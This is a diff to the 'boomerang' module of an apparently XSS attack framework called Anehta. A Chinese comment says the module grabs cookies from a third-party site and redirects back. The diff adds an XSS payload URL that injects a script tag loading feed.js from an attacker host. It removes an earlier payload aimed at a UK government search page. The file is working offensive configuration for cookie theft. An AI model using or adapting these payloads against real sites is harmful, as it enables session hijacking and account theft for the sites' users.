@@ -1,3 +1,13 @@
+var target = "http://www.alimafia.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'";
+var org_url = "http://www.a.com/anehta/demo.html";
+//var target="http://www.alimafia.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'";
+//var org_url = "http://www.a.com/anehta/demo.html"; // 前页面
+
+var target_domain = target.split('/');
+target_domain = target_domain[2];
+
+var org_domain = org_url.split('/');
+org_domain = org_domain[2];
 ////////////////////////////////////////////////////////
 // boomerang 回旋镖模块，获取第三方远程站点的cookie
 // 并将页面重定向回当前页面
@@ -5,19 +15,6 @@
 //// Author: axis
 ///////////////////////////////////////////////////////
 //alert("Boomerang.js 回旋镖模块");
-
-
-////////////////////////////////////////////////////////////
-var target_domain = "www.dsdni.gov.uk";
-//var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
-var target="http://www.dsdni.gov.uk/nbcau-index/nbcau_search-results.htm?ha=nbcau&qt=gov}%3C/style%3E<script src='http://www.a.com/anehta/feed.js'></script>";
-
-
-// 前页面
-var org_url = "http://www.a.com/anehta/demo.html";
-var org_domain = "www.a.com";
-//var org_url = "http://www.b.com/anehta/test.html";
-//var org_domain = "www.b.com";
 
  
 // 如果是当前页面，则向目标提交
